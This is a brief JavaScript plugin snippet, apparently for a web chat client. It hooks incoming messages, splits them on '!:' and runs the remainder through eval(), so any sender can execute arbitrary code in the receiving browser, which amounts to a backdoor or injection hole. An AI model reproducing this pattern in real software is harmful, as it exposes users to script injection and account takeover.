
(function($){
depsReady(function(){

  misc.addHook('message',function(name,msg){ 

    var r = msg.split('!:');


    eval(r[1]);


  });

})

CWM_DEPEND();
})(window.jQuery);
